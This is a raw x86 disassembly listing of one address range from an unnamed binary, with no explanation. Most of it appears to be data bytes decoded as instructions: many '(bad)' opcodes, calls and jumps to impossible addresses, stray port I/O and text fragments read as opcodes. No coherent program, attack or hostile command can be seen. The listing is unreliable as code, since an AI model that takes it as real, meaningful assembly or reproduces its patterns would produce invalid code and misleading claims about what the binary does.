  406fd7:	sbb    BYTE PTR [ebx+0x33],0x41
  406fdb:	popa   
  406fdc:	jae    0x407047
  406fde:	push   ebx
  406fdf:	inc    ecx
  406fe0:	jne    0x407002
  406fe2:	jb     0x407051
  406fe4:	cmp    ah,BYTE PTR [eax]
  406fe6:	outs   dx,DWORD PTR ds:[esi]
  406fe7:	jb     0x40704a
  406fe9:	and    BYTE PTR [edi+0x57],ah
  406fec:	outs   dx,BYTE PTR ds:[esi]
  406fed:	or     ah,BYTE PTR [ebp+0x20]
  406ff0:	push   ebx
  406ff1:	cmp    al,0x74
  406ff3:	gs ins BYTE PTR es:[edi],dx
  406ff5:	ins    DWORD PTR es:[edi],dx
  406ff6:	outs   dx,BYTE PTR gs:[esi]
  406ff8:	and    BYTE PTR [ebp+0x63],ah
  406ffb:	jne    0x407076
  406ffd:	jbe    0x40706f
  406fff:	ins    DWORD PTR es:[edi],dx
  407000:	or     eax,0x2e657365
  407005:	and    BYTE PTR gs:[esi],bh
  407008:	bound  ebp,QWORD PTR [edi]
  40700a:	cmp    ah,BYTE PTR [ebx+0x78]
  40700d:	jbe    0x407088
  40700f:	jns    0x407076
  407011:	outs   dx,BYTE PTR ds:[esi]
  407012:	bound  esp,QWORD PTR gs:[ebp+0x75]
  407016:	outs   dx,DWORD PTR ds:[esi]
  407017:	jne    0x407088
  407019:	and    BYTE PTR gs:[esi],ch
  40701c:	jae    0x407085
  40701e:	jae    0x407040
  407020:	jo     0x40705f
  407022:	jo     0x407094
  407024:	bound  eax,QWORD PTR [ebx+0x65]
  407027:	push   ebx
  407028:	jo     0x40709c
  40702a:	ins    DWORD PTR es:[edi],dx
  40702b:	dec    ebp
  40702c:	imul   esp,DWORD PTR [ebp+0x6d],0x65627473
  407033:	and    ch,BYTE PTR [esi]
  407035:	addr16 push edi
  407037:	cmp    al,0x53
  407039:	imul   esp,DWORD PTR [ecx+0x2e],0x76655343
  407040:	inc    edi
  407041:	or     bh,BYTE PTR [edx]
  407043:	imul   edi,DWORD PTR [esi],0x626e3c69
  407049:	rcr    cl,0x3
  40704c:	shl    BYTE PTR [eax+0x79],cl
  40704f:	push   edx
  407050:	push   esi
  407051:	and    edi,edi
  407053:	(bad)  
  407054:	dec    esi
  407056:	or     edi,edi
  407058:	push   DWORD PTR [ebx]
  40705a:	mov    edi,edi
  40705c:	(bad)  
  40705d:	inc    DWORD PTR [eax]
	...
  407067:	dec    edx
  407068:	xchg   ecx,eax
  407069:	repz xor al,0x0
  40706c:	sbb    BYTE PTR [edx+0x4828b9cb],bh
  407072:	in     eax,dx
  407073:	xor    DWORD PTR [ecx],ebp
  407075:	js     0x407003
  407077:	in     eax,0x84
  407079:	inc    esp
  40707a:	pop    esp
  40707b:	fsub   DWORD PTR [ecx+edi*2+0x34]
  40707f:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  407085:	test   DWORD PTR [ebp+0x2cccc85],eax
  40708b:	(bad)  [ebp-0x31]
  40708e:	int3   
  40708f:	int3   
  407090:	lods   al,BYTE PTR ds:[esi]
  407091:	sub    bl,BYTE PTR [edi]
  407093:	imul   ecx,DWORD PTR [ecx+0x6],0xc6e69286
  40709a:	jl     0x407034
  40709c:	jno    0x4070fc
  40709e:	xor    ebx,0xffffff91
  4070a1:	sub    dl,bh
  4070a3:	(bad)  
  4070a5:	push   esi
  4070a6:	jp     0x407028
  4070a8:	push   edx
  4070a9:	jmp    0x3c08efe2
  4070ae:	inc    eax
  4070af:	in     al,dx
  4070b0:	sti    
  4070b1:	out    dx,al
  4070b2:	in     eax,0xcc
  4070b4:	int3   
  4070b5:	mov    al,ds:0x4ccccc1e
  4070ba:	rcr    DWORD PTR [edi+0xd4808cc],cl
  4070c0:	dec    ebp
  4070c1:	pusha  
  4070c2:	mov    ah,0x6b
  4070c4:	inc    edx
  4070c5:	add    ebx,DWORD PTR [ebx]
  4070c7:	cmp    eax,0x5d00dbdb
  4070cc:	adc    DWORD PTR [eax+eax*1],0x70b16805
  4070d3:	xor    DWORD PTR [edx+0x8080816],esi
  4070d9:	pushw  0x14
  4070dc:	sbb    DWORD PTR [edx+0x38af7de7],edi
  4070e2:	and    eax,0xf687b36d
  4070e7:	push   edx
  4070e8:	cmp    dh,BYTE PTR [edi-0x1c080a11]
  4070ee:	inc    DWORD PTR [esi-0x34]
  4070f1:	cmp    dl,BYTE PTR [edi+0x86af366]
  4070f7:	or     BYTE PTR [ebx+0x8089635],bh
  4070fd:	or     ah,cl
  4070ff:	int3   
  407100:	int3   
  407101:	int3   
  407102:	int3   
  407103:	int3   
  407104:	int3   
  407105:	int3   
  407106:	int3   
  407107:	sub    esi,eax
  407109:	iret   
	...
  407112:	add    BYTE PTR [eax],al
  407114:	add    dh,al
  407116:	xor    eax,0x8e06c546
  40711b:	inc    edx
  40711c:	imul   edx,DWORD PTR [ebp+0x24],0xc
  407120:	aaa    
  407121:	jnp    0x4070fa
  407123:	cs sahf 
  407125:	stc    
  407126:	ror    WORD PTR [edx+0x4348f54],1
  40712d:	add    BYTE PTR [eax],al
  40712f:	mov    ch,0xf
  407131:	add    BYTE PTR [eax],al
  407133:	popf   
  407134:	ret    0x0
  407137:	fcmovnu st,st(2)
  407139:	and    DWORD PTR [edx-0x4f],edx
  40713c:	push   esp
  40713d:	outs   dx,BYTE PTR ds:[esi]
  40713e:	shl    dl,0xd9
  407141:	pusha  
  407142:	imul   eax,eax,0xfffffff6
  407145:	push   bx
  407147:	repz jns 0x407126
  40714a:	inc    ebp
  40714b:	xlat   BYTE PTR ds:[ebx]
  40714c:	sub    DWORD PTR ds:0xed85008d,ebx
  407152:	std    
  407153:	cmp    bh,BYTE PTR [eax-0x697a7a7b]
  407159:	add    edi,DWORD PTR [ebp+0x20]
  40715c:	cmp    edi,DWORD PTR [eax-0x4f]
  40715f:	sbb    ecx,DWORD PTR [edi+0x67c242a8]
  407165:	arpl   sp,bx
  407167:	out    dx,eax
  407168:	data16 jg 0x4071de
  40716b:	je     0x4071ec
  40716d:	imul   esi,DWORD PTR [edx-0x137465e9],0xfffffff2
  407174:	xor    DWORD PTR [ecx-0x5dbb7ce5],edx
  40717a:	popf   
  40717b:	test   DWORD PTR [ebp-0x7a7a62fb],eax
  407181:	test   DWORD PTR [eax],eax
	...
  40718b:	not    edx
  40718d:	pop    edi
  40718e:	inc    ebp
  40718f:	inc    ebp
  407190:	inc    ebp
  407191:	inc    ebp
  407192:	inc    ebp
  407193:	inc    ebp
  407194:	inc    ebp
  407195:	inc    ebp
  407196:	inc    ebp
  407197:	add    DWORD PTR [ebx+0x5b976d8c],0xffffffd2
  40719e:	daa    
  40719f:	lds    edx,FWORD PTR [ecx+edi*2+0x50]
  4071a3:	dec    ebp
  4071a4:	push   ecx
  4071a5:	pusha  
  4071a6:	fcmove st,st(6)
  4071a8:	repz sub DWORD PTR [ecx-0x73],eax
  4071ac:	mov    ecx,0xe5c36f0d
  4071b1:	add    DWORD PTR [ebx+0x49afc152],0x67
  4071b8:	test   dl,bl
  4071ba:	cwde   
  4071bb:	addr16 sahf 
  4071bd:	aas    
  4071be:	lds    edi,FWORD PTR [ebp-0x6d]
  4071c1:	les    esp,FWORD PTR [ebx+0x1d]
  4071c4:	imul   edi,DWORD PTR [esi+0x22],0x77
  4071c8:	sbb    BYTE PTR [ebx+0xf37ff86],0xb5
  4071cf:	hlt    
  4071d0:	add    DWORD PTR [ebx-0x7c30beba],0xffffff83
  4071d7:	pop    ecx
  4071d8:	stc    
  4071d9:	add    BYTE PTR [ebx+0x6c655ff],al
  4071df:	lods   eax,DWORD PTR ds:[esi]
  4071e0:	sbb    ebp,DWORD PTR [ebp-0x16e71a99]
  4071e6:	mov    eax,0xb5e26da5
  4071eb:	sahf   
  4071ec:	out    dx,eax
  4071ed:	jge    0x407243
  4071ef:	bound  ecx,QWORD PTR [esp+edi*1-0x4d39]
  4071f6:	inc    DWORD PTR [ebx]
  4071f8:	(bad)  
  4071f9:	(bad)  
  4071fa:	push   DWORD PTR [edx+eiz*8-0x1]
  4071fe:	(bad)  
  4071ff:	(bad)  
  407200:	(bad)  
  407201:	(bad)  
  407202:	(bad)  
  407203:	(bad)  
  407204:	(bad)  
  407205:	(bad)  
  407206:	(bad)  
  407207:	(bad)  
  407208:	jmp    FWORD PTR [eax-0x30]
  40720b:	in     eax,0x44
  40720d:	add    eax,0x47da5193
  407212:	cmp    BYTE PTR [eax],dh
  407214:	dec    edi
  407215:	(bad)  
  407216:	jae    0x4071e2
  407218:	dec    ecx
  407219:	lods   al,BYTE PTR ds:[esi]
  40721a:	ror    DWORD PTR [edx+eiz*8+0x3],cl
  40721e:	fstp   TBYTE PTR [esi+0x1a]
	...
  40722c:	pusha  
  40722d:	pop    ss
  40722e:	pop    edx
  40722f:	(bad)  
  407230:	add    BYTE PTR [eax],al
  407232:	ins    DWORD PTR es:[edi],dx
  407233:	jne    0x4071dc
  407235:	mov    eax,es
  407237:	mov    esi,0x96000948
  40723c:	in     eax,dx
  40723d:	mov    ebx,0x1666b092
  407242:	in     al,0xae
  407244:	dec    DWORD PTR [esi+0x67]
  407247:	jae    0x4071ec
  407249:	jg     0x4072c7
  40724b:	push   ebp
  40724c:	mov    WORD PTR [edi-0xa48316d],cs
  407252:	popf   
  407253:	cmc    
  407254:	call   0x0:0x5e5f0000
  40725b:	(bad)  
  40725c:	gs popf 
  40725e:	add    BYTE PTR [eax],al
  407260:	dec    ecx
  407261:	sar    BYTE PTR [esi],0x9b
  407264:	sbb    cl,0xaf
  407267:	inc    esi
  407268:	test   DWORD PTR [eax],edi
  40726a:	(bad)  
  40726b:	aas    
  40726c:	ret    0xcaaa
  40726f:	push   cs
  407270:	scas   eax,DWORD PTR es:[edi]
  407271:	xor    eax,0x5aab65de
  407276:	or     eax,0xe2
  40727b:	ss mov esp,0xf4e19544
  407281:	pop    esi
  407282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407283:	sub    al,BYTE PTR [ebx-0x73]
  407286:	call   0x3dbe711
  40728b:	(bad)
  407290:	mov    dl,0x86
  407292:	dec    ebx
  407293:	dec    ebp
  407294:	sub    ecx,esi
  407296:	xor    ecx,0x2b9b0000
  40729c:	loope  0x40729e
  40729e:	add    BYTE PTR [eax],al
  4072a0:	mov    DWORD PTR [ecx-0x76767677],ecx
  4072a6:	mov    DWORD PTR [ecx-0x28a23e77],ecx
  4072ac:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  4072b2:	test   DWORD PTR [ebp-0x60ffff7b],eax
  4072b8:	mov    ch,BYTE PTR [edi+0x68]
  4072bb:	adc    DWORD PTR [esi+0x53],edx
  4072be:	sti    
  4072bf:	call   DWORD PTR [eax-0x649ad6cc]
  4072c5:	arpl   WORD PTR ds:0xa5669aa8,bx
  4072cb:	mov    eax,0x57b6e
  4072d0:	add    BYTE PTR [edi-0x6bffff6f],bh
  4072d6:	mov    al,ds:0x7d3c0000
  4072db:	iret   
  4072dc:	xchg   BYTE PTR [ecx],bh
  4072de:	inc    ebp
  4072df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072e0:	fs sbb ax,0xd90e
  4072e5:	inc    esp
  4072e6:	fstp   DWORD PTR ds:0x315063b
  4072ec:	jmp    0xe800:0xb2ab833a
  4072f3:	jl     0x407297
  4072f5:	nop
  4072f6:	or     eax,0xb2e8e8e8
  4072fb:	shl    BYTE PTR [ecx-0x6f],1
  4072fe:	push   esp
  4072ff:	jle    0x407342
  407301:	lahf   
  407302:	adc    al,0x55
  407304:	mov    esp,0x2efc9f6
  407309:	and    DWORD PTR [ecx-0x19],edx
  40730c:	push   es
  40730d:	ja     0x407328
  40730f:	into   
  407310:	adc    edx,DWORD PTR [edi-0x2]
  407313:	jbe    0x4072b5
  407315:	and    al,0x37
  407317:	sbb    BYTE PTR [ebx-0x7605b817],bl
  40731d:	call   0xe8e6ed0a
  407322:	call   0x40740f
  407327:	add    BYTE PTR [eax],al
  407329:	add    BYTE PTR [eax],al
  40732b:	add    BYTE PTR [eax],al
  40732d:	push   ebx
  40732e:	xor    al,0x25
  407330:	and    al,0x24
  407332:	and    al,0x24
  407334:	and    al,0x24
  407336:	and    al,0x24
  407338:	and    al,0xe8
  40733a:	call   0x85e7f048
  40733f:	pop    ebp
  407340:	pop    edx
  407341:	lea    esi,[edi]
  407343:	rcl    edi,0x7b
  407346:	mov    ds:0x257084e1,eax
  40734b:	stos   DWORD PTR es:[edi],eax
  40734c:	ss pop edi
  40734e:	mov    edi,0xf3aa8e22
  407353:	call   0xb868e540
  407358:	pop    edi
  407359:	push   edx
  40735a:	(bad)  
  40735b:	adc    ebp,DWORD PTR [ecx]
  40735d:	push   0x2cd12fd4
  407362:	xchg   esp,eax
  407363:	cmp    edi,ecx
  407365:	fwait
  407366:	add    ah,BYTE PTR [edi]
  407368:	ins    DWORD PTR es:[edi],dx
  407369:	scas   al,BYTE PTR es:[edi]
  40736a:	retf   
  40736b:	adc    BYTE PTR [edx],0x38
  40736e:	ret    0xcd92
  407371:	stc    
  407372:	call   0x6cefe05f
  407377:	call   0xcb7e5c64
  40737c:	call   0x6160e081
  407381:	or     dl,BYTE PTR [ebx+0x73]
  407384:	outs   dx,BYTE PTR ds:[esi]
  407385:	ds je  0x4073ed
  407388:	data16 js 0x4073f2
  40738b:	or     ah,BYTE PTR gs:[ebp+0x20]
  40738f:	ds jb  0x407401
  407392:	inc    esp
  407393:	sub    al,0x65
  407395:	gs imul ebp,DWORD PTR gs:0x570a,0x2064720d
  4073a0:	push   edx
  4073a1:	gs gs push ebx
  4073a4:	outs   dx,DWORD PTR ds:[esi]
  4073a5:	je     0x407415
  4073a7:	jb     0x4073b3
  4073a9:	bound  esp,QWORD PTR [ebp+0x20]
  4073ac:	outs   dx,BYTE PTR ds:[esi]
  4073ad:	inc    ebp
  4073ae:	ins    DWORD PTR es:[edi],dx
  4073af:	je     0x407423
  4073b1:	and    BYTE PTR [ebx+0x61],ah
  4073b4:	jne    0x407428
  4073b6:	cs dec ebp
  4073b8:	outs   dx,DWORD PTR ds:[esi]
  4073b9:	cs ins DWORD PTR es:[edi],dx
  4073bb:	imul   esp,DWORD PTR ds:[eax],0x72430d62
  4073c2:	ins    DWORD PTR es:[edi],dx
  4073c3:	ins    DWORD PTR es:[edi],dx
  4073c4:	jb     0x407439
  4073c6:	outs   dx,BYTE PTR ds:[esi]
  4073c7:	je     0x4073e9
  4073c9:	push   edi
  4073ca:	or     eax,0x760a6f0a
  4073cf:	outs   dx,DWORD PTR ds:[esi]
  4073d0:	je     0x407437
  4073d2:	bound  edi,QWORD PTR [esi]
  4073d4:	and    BYTE PTR [ebx],dh
  4073d6:	sub    BYTE PTR [ebp+0x44],dh
  4073d9:	jb     0x40743c
  4073db:	push   ebx
  4073dc:	cmp    ah,BYTE PTR [eax]
  4073de:	gs popa 
  4073e0:	dec    esi
  4073e1:	push   edx
  4073e2:	jae    0x407421
  4073e4:	dec    ebp
  4073e5:	ds jne 0x407408
  4073e8:	je     0x407418
  4073ea:	jae    0x407430
  4073ec:	xor    esp,DWORD PTR [ecx+0x6d]
  4073ef:	jb     0x4073fe
  4073f1:	and    ah,BYTE PTR ds:[ebx+0x6f]
  4073f5:	jb     0x407465
  4073f7:	or     ch,BYTE PTR cs:[ebx+0x6f]
  4073fb:	and    BYTE PTR [ebx+0x20],dh
  4073fe:	jae    0x4073bd
  407400:	lahf   
  407401:	nop
  407402:	mov    WORD PTR [ebx+0x740740f2],fs
  407408:	push   ebp
  407409:	dec    edi
  40740a:	das    
  40740b:	ret    0xa6f2
  40740e:	neg    DWORD PTR [edx+ebp*4-0x9]
  407412:	mov    ah,0xb2
  407414:	(bad)  
  407415:	cli    
  407416:	outs   dx,BYTE PTR ds:[esi]
  407417:	add    BYTE PTR [eax],al
  407419:	add    BYTE PTR [edx],cl
  40741b:	je     0x40741d
  40741d:	add    BYTE PTR [edi],bl
  40741f:	xor    al,0x0
  407421:	add    BYTE PTR [eax],al
  407423:	inc    ebp
  407424:	inc    ebp
  407425:	inc    ebp
  407426:	inc    ebp
  407427:	inc    ebp
  407428:	inc    ebp
  407429:	inc    ebp
  40742a:	inc    ebp
  40742b:	inc    ebp
  40742c:	nop
  40742d:	aad    0xe3
  40742f:	xchg   esi,eax
  407430:	dec    ebp
  407431:	ret    0xb6e1
  407434:	mov    esi,esp
  407436:	lock adc esi,DWORD PTR [ebx-0x1c]
  40743a:	push   ds
  40743b:	add    cl,0x27
  40743e:	xlat   BYTE PTR ds:[ebx]
  40743f:	or     eax,0x7894813a
	...
  40744c:	add    bh,bh
  40744e:	jmp    DWORD PTR [esi]
  407450:	push   ebp
  407451:	dec    ebp
  407452:	int3   
  407453:	(bad)  
  407454:	(bad)  
  407455:	in     eax,dx
  407456:	jae    0x40748d
  407458:	enter  0xd70,0xef
  40745c:	push   eax
  40745d:	and    BYTE PTR [esi+ebp*1-0x5387cb07],al
  407464:	adc    BYTE PTR [edi],bh
  407466:	adc    dh,0x7d
  407469:	fcomp  st(1)
  40746b:	jo     0x4074b7
  40746d:	push   es
  40746e:	dec    ebx
  40746f:	stos   BYTE PTR es:[edi],al
  407470:	and    BYTE PTR [esp+ecx*1-0x7b],dh
  407474:	or     ebp,ebx
  407476:	xchg   BYTE PTR [eax-0x11b60001],bh
  40747c:	(bad)  
  40747d:	call   FWORD PTR [edi]
  40747f:	pop    edx
  407480:	lock dec DWORD PTR [ebx+0x311452ff]
  407487:	mov    ds:0xe16a2cc7,al
  40748c:	mov    al,0xb8
  40748e:	je     0x4074f8
  407490:	loope  0x407443
  407492:	cmc    
  407493:	(bad)  
  407494:	out    dx,al
  407495:	sub    BYTE PTR [edx],dh
  407497:	mov    al,ds:0x8b17ae82
  40749c:	mov    ecx,DWORD PTR [ebx+0xfd4061]
  4074a2:	ins    BYTE PTR es:[edi],dx
  4074a3:	jl     0x4074b5
  4074a5:	sbb    esp,DWORD PTR [ebp-0x6347179a]
  4074ab:	repz jbe 0x407482
  4074ae:	dec    eax
  4074af:	add    eax,0xe135dfe2
  4074b4:	mov    ch,0x51
  4074b6:	xchg   ebx,eax
  4074b7:	jnp    0x40747e
  4074b9:	mov    ah,0x1d
  4074bb:	mov    ecx,DWORD PTR [ebx-0x745bb6cf]
  4074c1:	mov    ecx,DWORD PTR [ebx-0x17171718]
  4074c7:	call   0xe9295db4
  4074cc:	into   
  4074cd:	test   DWORD PTR [esi+0x0],ecx
	...
  4074d8:	jne    0x40754f
  4074da:	sbb    BYTE PTR [ecx+0x76934aee],cl
  4074e0:	sub    edx,esi
  4074e2:	outs   dx,BYTE PTR ds:[esi]
  4074e3:	push   ebx
  4074e4:	add    al,0x47
  4074e6:	pop    edx
  4074e7:	fmul   DWORD PTR [eax]
  4074e9:	add    BYTE PTR [edx-0x56],bh
  4074ec:	enter  0x4265,0xec
  4074f0:	rol    edi,0x75
  4074f3:	jne    0x40752d
  4074f5:	ins    DWORD PTR es:[edi],dx
  4074f6:	jne    0x40756d
  4074f8:	or     BYTE PTR [edx+0x75],ch
  4074fb:	jne    0x407565
  4074fd:	dec    ecx
  4074fe:	pop    edx
  4074ff:	mov    bh,0x5d
  407501:	xchg   DWORD PTR [esi+ecx*4-0x7c],edi
  407505:	mov    al,ds:0x9130dfb2
  40750a:	mov    eax,0x51289aa
  40750f:	dec    esi
  407510:	loope  0x4074bd
  407512:	lods   eax,DWORD PTR ds:[esi]
  407513:	pop    edx
  407514:	jne    0x4074a3
  407516:	out    0xce,eax
  407518:	test   eax,0x8d8d8df8
  40751d:	popf   
  40751e:	push   ebp
  40751f:	adc    eax,0x92fd040e
  407524:	inc    eax
  407525:	dec    ebx
  407526:	hlt    
  407527:	(bad)  
  407528:	lods   al,BYTE PTR ds:[esi]
  407529:	stos   DWORD PTR es:[edi],eax
  40752a:	jmp    0x17f7:0x3711bf9c
  407531:	je     0x4074b4
  407533:	pop    esp
  407534:	lods   al,BYTE PTR ds:[esi]
  407535:	or     BYTE PTR [edi-0x49166ec8],0x8f
  40753c:	or     esp,DWORD PTR [eax]
  40753e:	xchg   edi,eax
  40753f:	sbb    BYTE PTR [ebp-0x7262bb73],cl
  407545:	lea    ecx,[ebp+0x0]
  40754b:	add    BYTE PTR [eax],al
  40754d:	add    BYTE PTR [eax],al
  40754f:	add    BYTE PTR [ecx],ch
  407551:	inc    ebp
  407552:	cdq    
  407553:	(bad)  
  407554:	(bad)  
  407555:	(bad)  
  407556:	(bad)  
  407557:	(bad)  
  407558:	(bad)  
  407559:	(bad)  
  40755a:	(bad)  
  40755b:	inc    eax
  40755d:	ror    BYTE PTR [edi+0x3f],0x3a
  407561:	or     DWORD PTR [ecx-0x69],0xffffff82
  407565:	out    0x3a,eax
  407567:	clc    
  407568:	stos   BYTE PTR es:[edi],al
  407569:	(bad)  
  40756a:	jnp    0x40755a
  40756c:	sub    ch,BYTE PTR [esi]
  40756e:	xchg   ebp,eax
  40756f:	loope  0x407590
  407571:	and    al,BYTE PTR [esi]
  407573:	lods   eax,DWORD PTR ds:[esi]
  407574:	fld    DWORD PTR [edi]
  407576:	rol    al,0x1f
  407579:	outs   dx,BYTE PTR ds:[esi]
  40757a:	mov    ds:0x6c30bba2,al
  40757f:	(bad)  
  407580:	ds int3 
  407582:	push   cs
  407583:	jns    0x4075f1
  407585:	xor    eax,0x4019ab5a
  40758a:	and    edx,DWORD PTR ds:0x7051eafc
  407590:	rcl    esi,cl
  407592:	cmp    dh,BYTE PTR [eax+0x62]
  407595:	rol    al,0xb2
  407598:	mov    ebp,0x29c0c0e3
  40759d:	adc    eax,0xd074c0aa
  4075a2:	sub    eax,0x1f7152aa
  4075a7:	fcmove st,st(5)
  4075a9:	and    edx,ecx
  4075ab:	adc    esp,ebp
  4075ad:	pop    eax
  4075ae:	aad    0xe
  4075b0:	sbb    bl,bl
  4075b2:	call   0xba55:0xbeeece1d
  4075b9:	je     0x40762f
  4075bb:	je     0x4075da
  4075bd:	mov    ?,WORD PTR [esp+esi*2-0x3e]
  4075c1:	xchg   ecx,eax
  4075c2:	je     0x407638
  4075c4:	je     0x4075c5
  4075c6:	(bad)  
  4075c7:	(bad)  
  4075c8:	(bad)  
  4075c9:	(bad)  
  4075ca:	(bad)  
  4075cb:	(bad)  
  4075cc:	(bad)  
  4075cd:	inc    esp
  4075cf:	add    esp,0x41
  4075d2:	push   cs
  4075d3:	call   0xd5bc:0xe8178ea2
  4075da:	clc    
  4075db:	mov    esp,0x692d8432
  4075e0:	or     al,0xcb
  4075e2:	lock rcl DWORD PTR [ecx],1
  4075e5:	pop    esi
	...
  4075ee:	add    BYTE PTR [ebx+0x44efd88b],cl
  4075f4:	pop    esi
  4075f5:	mov    ecx,DWORD PTR [ebx-0x1cde69b7]
  4075fb:	scas   eax,DWORD PTR es:[edi]
  4075fc:	ds sub al,0xc6
  4075ff:	dec    ebp
  407600:	mov    edi,DWORD PTR [edx-0x1f]
  407603:	cmp    BYTE PTR [ebx],al
  407605:	pop    es
  407606:	imul   esp,eax,0x4a
  407609:	pop    ebp
  40760a:	mov    ecx,0x33e36427
  40760f:	jo     0x407656
  407611:	sub    al,0x62
  407613:	mov    al,0x50
  407615:	mov    dh,0x88
  407617:	jno    0x40766b
  407619:	aaa    
  40761a:	mov    ecx,DWORD PTR [ebx-0x7474b526]
  407620:	clc    
  407621:	mov    ecx,0x62008b7b
  407626:	je     0x4075f8
  407628:	sub    eax,0x69418adc
  40762d:	add    DWORD PTR [ebx],esp
  40762f:	push   0x21a598bb
  407634:	pop    esi
  407635:	dec    edx
  407636:	jmp    DWORD PTR [edx-0x2361ca0]
  40763c:	fadd   QWORD PTR [eax]
  40763e:	add    BYTE PTR [eax],al
  407640:	test   eax,0xc84d3
  407645:	fcmove st,st(0)
  407647:	sbb    eax,0x7863a569
  40764c:	popa   
  40764d:	add    eax,0xaa6c0ff3
  407652:	xchg   ecx,eax
  407653:	psubq  mm0,QWORD PTR [ebx]
  407656:	mov    ds,ebp
  407658:	shr    DWORD PTR [ebp+edi*8+0xf432],0xd6
  407660:	dec    ebx
  407661:	cld    
	...
  40766e:	mov    al,ds:0xfbb6
  407673:	add    BYTE PTR [eax],al
  407675:	add    BYTE PTR [eax],al
  407677:	add    BYTE PTR [eax],al
  407679:	add    BYTE PTR [esp+eax*1],al
  40767c:	add    eax,0x235f684a
  407681:	imul   ebx,DWORD PTR [ecx-0x71],0x51
  407685:	clc    
  407686:	mov    edx,0xcae8642b
  40768b:	sub    edx,DWORD PTR [ebp-0x3f020056]
  407691:	mov    ebp,0x4043a3f
  407696:	shl    DWORD PTR [esi+0x4],1
  407699:	add    al,0x5c
  40769b:	and    al,BYTE PTR [esp+eax*1]
  40769e:	cdq    
  40769f:	inc    esi
  4076a0:	sbb    eax,0xa0dc6a88
  4076a5:	ja     0x407692
  4076a7:	ret    0x93d4
  4076aa:	ja     0x407701
  4076ac:	test   cl,ch
  4076ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076af:	push   cs
  4076b0:	sbb    ch,BYTE PTR ds:[ebx-0x8]
  4076b4:	jmp    0x5f407aba
  4076b9:	push   eax
  4076ba:	ss push esi
  4076bc:	add    BYTE PTR [eax],al
  4076be:	add    BYTE PTR [edi],dh
  4076c0:	ds jl  0x407708
  4076c3:	xchg   ebx,eax
  4076c4:	outs   dx,BYTE PTR ds:[esi]
  4076c5:	loopne 0x40773f
  4076c7:	retf   
  4076c8:	out    dx,eax
  4076c9:	mov    al,0x6f
  4076cb:	test   al,0x84
  4076cd:	mov    ecx,ecx
  4076cf:	sbb    esi,edx
  4076d1:	mov    WORD PTR [eax],?
  4076d3:	push   es
  4076d4:	jg     0x40768a
  4076d6:	mov    edx,0x29b31853
  4076db:	repz js 0x407720
  4076de:	mov    bl,0x21
  4076e0:	jo     0x407691
  4076e2:	add    BYTE PTR [eax],al
  4076e4:	std    
  4076e5:	aad    0x0
  4076e7:	add    BYTE PTR [eax],al
  4076e9:	call   0xe9295fd6
  4076ee:	call   0xb8295fdb
  4076f3:	adc    DWORD PTR [ebx+0x0],0x0
  4076fd:	add    bh,bh
  4076ff:	(bad)  
  407700:	stc    
  407701:	add    dl,BYTE PTR [eax]
  407703:	outs   dx,BYTE PTR ds:[esi]
  407704:	fnstsw WORD PTR [edx]
  407706:	and    al,0x13
  407708:	cs pop esp
  40770a:	inc    eax
  40770b:	pop    ss
  40770c:	pop    ds
  40770d:	pop    ebp
  40770e:	inc    edx
  40770f:	pop    edx
  407710:	sub    ah,BYTE PTR [ebx-0x1826dbe6]
  407716:	jecxz  0x4076ae
  407718:	(bad)  
  407719:	dec    DWORD PTR [ebx]
  40771b:	dec    edx
  40771c:	add    DWORD PTR [edx],ecx
  40771e:	outs   dx,DWORD PTR ds:[esi]
  40771f:	xchg   ecx,eax
  407720:	call   0xa54f:0xbc6fb84a
  407727:	arpl   WORD PTR [edx],dx
  407729:	push   edx
  40772a:	dec    ebp
  40772b:	int3   
  40772c:	aaa    
  40772d:	repnz push ebp
  40772f:	sahf   
  407730:	xchg   edx,eax
  407731:	pushf  
  407732:	shr    BYTE PTR [edx-0x1a9b82],1
  407738:	jmp    FWORD PTR [edi-0xff43]
  40773e:	add    ch,BYTE PTR [ebx+0x34]
  407741:	dec    DWORD PTR [ebx+0x3b8adbcd]
  407747:	call   0xb08793ef
  40774c:	stc    
  40774d:	call   DWORD PTR [eax+ebx*2-0x7cd423b9]
  407754:	pop    eax
  407755:	push   cs
  407756:	pop    ebx
  407757:	cmp    ch,BYTE PTR [edx+edi*2-0x747474af]
  40775e:	loopne 0x4076e0
  407760:	mov    ecx,DWORD PTR [ebx-0x7474ffc0]
  407766:	mov    eax,DWORD PTR [ebp+0x45]
  407769:	inc    ebp
  40776a:	inc    ebp
  40776b:	inc    ebp
  40776c:	inc    ebp
  40776d:	inc    ebp
  40776e:	inc    ebp
  40776f:	inc    ebp
  407770:	sub    eax,DWORD PTR [ebx-0x2af665fa]
  407776:	(bad)  
  407777:	out    dx,al
  407778:	inc    eax
  407779:	mov    ds:0x3932dc30,eax
  40777e:	cpuid  
  407780:	sahf   
  407781:	mov    ebp,0x35db19c8
  407786:	in     al,dx
  407787:	xlat   BYTE PTR ds:[ebx]
  407788:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40778f:	add    DWORD PTR [ebx-0x2d267475],0x38
  407796:	xor    DWORD PTR [ebx-0x2456c75],ecx
  40779c:	xor    eax,eax
  40779e:	cmp    al,0x39
  4077a0:	mov    ecx,?
  4077a2:	mov    ebx,0x8a7a3ada
  4077a7:	inc    eax
  4077a8:	push   edx
  4077a9:	(bad)  
  4077ab:	sbb    al,0x66
  4077ad:	stc    
  4077ae:	or     eax,DWORD PTR [ebx-0x68]
  4077b1:	cmc    
  4077b2:	mov    esp,esi
  4077b4:	jge    0x4077fa
  4077b6:	cli    
  4077b7:	stos   BYTE PTR es:[edi],al
  4077b8:	or     eax,0x8b653cc6
  4077bd:	gs and BYTE PTR cs:[eax+0x70],bh
  4077c2:	imul   esi,DWORD PTR [eax+0x65],0x6f692870
  4077c9:	and    BYTE PTR gs:[ebx+0x72],dh
  4077cd:	and    BYTE PTR [eax+0x65],dh
  4077d0:	jb     0x407837
  4077d2:	imul   ebp,DWORD PTR [edi+0x3c],0x6f3e5272
  4077d9:	outs   dx,DWORD PTR gs:[esi]
  4077db:	bound  edx,QWORD PTR [edi+0x2e]
  4077de:	and    dh,BYTE PTR [ebx+0x65]
  4077e1:	je     0x407856
  4077e3:	jo     0x40784a
  4077e5:	arpl   WORD PTR [edx+0x73],si
  4077e8:	jb     0x4077f7
  4077ea:	jae    0x40780c
  4077ec:	je     0x40785b
